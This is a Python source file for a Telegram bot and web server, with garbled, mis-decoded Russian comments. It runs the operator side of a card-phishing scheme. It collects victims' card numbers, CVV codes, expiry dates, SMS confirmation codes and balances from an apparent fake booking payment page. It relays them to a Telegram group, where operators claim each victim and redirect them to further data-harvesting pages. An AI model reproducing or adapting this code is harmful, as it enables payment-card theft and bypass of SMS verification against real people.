# bot.py - –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI
import uvicorn
import asyncio
import httpx
import config
import sqlite3
import datetime
from contextlib import contextmanager

bot = Bot(token=config.TOKEN)
dp = Dispatcher()
app = FastAPI()

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
def init_db():
    with sqlite3.connect('logs.db') as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                session_id TEXT PRIMARY KEY,
                masked_pan TEXT,
                booking_id TEXT,
                taken_by INTEGER,
                step TEXT DEFAULT 'full',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ë–î
@contextmanager
def get_db_connection():
    conn = sqlite3.connect('logs.db')
    conn.row_factory = sqlite3.Row  # –ß—Ç–æ–±—ã –ø–æ–ª—É—á–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –∫–∞–∫ —Å–ª–æ–≤–∞—Ä–∏
    try:
        yield conn
    finally:
        conn.close()

# –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
# bot.py - –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è notify
# bot.py - –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è notify –¥–ª—è –ø–æ–ª–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
@app.post("/notify")
async def notify(data: dict):
    try:
        session_id = data["sessionId"]
        masked_pan = data["maskedPan"]
        booking_id = data.get("bookingId", session_id[:8].upper())
        step = data.get("step", "full")
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            
            if step == "card_number_only":
                # –ü–µ—Ä–≤—ã–π —à–∞–≥ - —Ç–æ–ª—å–∫–æ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, step, datetime.datetime.now()))
                
                # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —Å –ø—Ä–æ–±–µ–ª–∞–º–∏
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üéØ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –∫–∞—Ä—Ç—É, –ø—Ä–∏–≥–æ—Ç–æ–≤–∏—Ç—å—Å—è!\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n"
                    f"üîπ {masked_pan}\n"
                    f"üîπ {card_with_spaces}\n\n"
                    f"‚è≥ –û–∂–∏–¥–∞–µ–º CVV –∏ expiry date..."
                )
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –±–µ–∑ –∫–Ω–æ–ø–∫–∏ "–í–∑—è—Ç—å –ª–æ–≥"
                await bot.send_message(config.GROUP_ID, message_text)
                
            elif step == "completed":
                # –í—Ç–æ—Ä–æ–π —à–∞–≥ - –ø–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                cvv = data.get("cvv", "N/A")
                expire_date = data.get("expireDate", "N/A")
                
                cursor.execute('''
                    UPDATE logs 
                    SET masked_pan = ?, step = ?, updated_at = ?
                    WHERE session_id = ?
                ''', (masked_pan, step, datetime.datetime.now(), session_id))
                
                # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —Å –ø—Ä–æ–±–µ–ª–∞–º–∏
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id}\n"
                    f"üîî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–∂–∏–¥–∞–µ—Ç üîî\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n\n"
                    f"üîπ {masked_pan}\n"
                    f"üîπ {card_with_spaces}\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="–í–∑—è—Ç—å –ª–æ–≥", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)
                
            else:
                # –°—Ç–∞—Ä–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, "full", datetime.datetime.now()))
                
                # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —Å –ø—Ä–æ–±–µ–ª–∞–º–∏
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id}\n"
                    f"üîî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–∂–∏–¥–∞–µ—Ç üîî\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n\n"
                    f"üîπ {masked_pan}\n"
                    f"üîπ {card_with_spaces}\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="–í–∑—è—Ç—å –ª–æ–≥", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)

            conn.commit()

        return {"status": "ok"}
    
    except Exception as e:
        print(f"Error in /notify: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.post("/balance-notify")
async def balance_notify(data: dict):
    session_id = data["sessionId"]
    balance = data["balance"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"‚úÖ –ë–∞–ª–∞–Ω—Å —é–∑–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω!\n\nüí∞ –°—É–º–º–∞: {balance} AED"
        )
    return {"status": "ok"}

@app.post("/sms-notify")
async def sms_notify(data: dict):
    session_id = data["sessionId"]
    sms = data["sms"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"‚úÖ –ö–æ–¥ —Å–º—Å –ø–æ–ª—É—á–µ–Ω!\n\nüî¢ –ö–æ–¥: {sms}"
        )
    return {"status": "ok"}

@app.post("/change-card-notify")
async def change_card_notify(data: dict):
    session_id = data["sessionId"]
    changed_card = data["changed_card"]
    changed_expire = data["changed_expire"]
    changed_cvv = data["changed_cvv"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"‚úÖ –Æ–∑–µ—Ä –∏–∑–º–µ–Ω–∏–ª –∫–∞—Ä—Ç—É\n\nüîÑüí≥ –ù–æ–≤–∞—è –∫–∞—Ä—Ç–∞: {changed_card}\nüîÑüóìÔ∏è –ù–æ–≤—ã–π —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {changed_expire}\nüîÑüîí –ù–æ–≤—ã–π CVV: {changed_cvv}"
        )
    return {"status": "ok"}

# –í–∑—è—Ç—å –ª–æ–≥
# –í–∑—è—Ç—å –ª–æ–≥
@dp.callback_query(F.data.startswith("take:"))
async def take_log(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∑–∞–Ω—è—Ç –ª–∏ –ª–æ–≥
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
        if not log:
            await callback.answer("–õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
            return
            
        if log['taken_by']:
            await callback.answer("–≠—Ç–æ—Ç –ª–æ–≥ —É–∂–µ –∑–∞–Ω—è—Ç", show_alert=True)
            return

        # –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å - –æ—Ç–º–µ—á–∞–µ–º, —á—Ç–æ –ª–æ–≥ –≤–∑—è—Ç
        cursor.execute('''
            UPDATE logs 
            SET taken_by = ?, updated_at = ?
            WHERE session_id = ?
        ''', (callback.from_user.id, datetime.datetime.now(), session_id))
        conn.commit()

        # –î–æ—Å—Ç–∞—ë–º –¥–∞–Ω–Ω—ã–µ –ø–æ session_id
        async with httpx.AsyncClient() as client:
            customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
            card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
            booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

        booking_id = log['booking_id'] or "N/A"
        
        text = (
            f"–õ–æ–≥ #{booking_id}\n\n"
            f"üí≥  –ö–∞—Ä—Ç–∞: {card.get('full_pan')}\n"
            f"üóìÔ∏è  –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {card.get('expire_date')}\n"
            f"üîí  CVV: {card.get('cvv')}\n"
            f"üë§  –ò–º—è: {customer.get('name')} {customer.get('surname')}\n\n"
            f"üìû  –ù–æ–º–µ—Ä: {customer.get('phone')}\n\n"
            f"üí∏  –°—É–º–º–∞: {booking.get('total_amount')}.00 AED"
        )

        management_kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="üí∞ –ë–∞–ª–∞–Ω—Å", callback_data=f"balance:{session_id}"),
                InlineKeyboardButton(text="üìû SMS", callback_data=f"sms:{session_id}"),
                InlineKeyboardButton(text="üîÑ –ò–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É", callback_data=f"change:{session_id}"),
                InlineKeyboardButton(text="‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞", callback_data=f"success:{session_id}")
            ]
        ])

        await bot.send_message(callback.from_user.id, text, reply_markup=management_kb)
        
        # –ú–µ–Ω—è–µ–º —Ç–æ–ª—å–∫–æ –∫–Ω–æ–ø–∫—É –≤ –∏—Å—Ö–æ–¥–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–∏
        new_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"–õ–æ–≥ –≤–∑—è–ª @{callback.from_user.username}", callback_data="already_taken")]
        ])
        
        await callback.message.edit_reply_markup(reply_markup=new_kb)
        await callback.answer()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ë–∞–ª–∞–Ω—Å"
@dp.callback_query(F.data.startswith("balance:"))
async def handle_balance(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ –ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-balance", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±–∞–ª–∞–Ω—Å–∞")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "SMS"
@dp.callback_query(F.data.startswith("sms:"))
async def handle_sms(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ –ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-sms", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–æ–¥–∞")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É"
@dp.callback_query(F.data.startswith("change:"))
async def handle_change(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ –ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-change", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∑–∞–º–µ–Ω—ã –∫–∞—Ä—Ç—ã")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

@dp.callback_query(F.data.startswith("success:"))
async def handle_change(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ –ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-success", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞!")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

async def main():
    init_db()  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
    bot_task = asyncio.create_task(dp.start_polling(bot))

    config_uvicorn = uvicorn.Config(app, host="0.0.0.0", port=8000, loop="asyncio")
    server = uvicorn.Server(config_uvicorn)
    server_task = asyncio.create_task(server.serve())

    await asyncio.gather(bot_task, server_task)

if __name__ == "__main__":
    asyncio.run(main())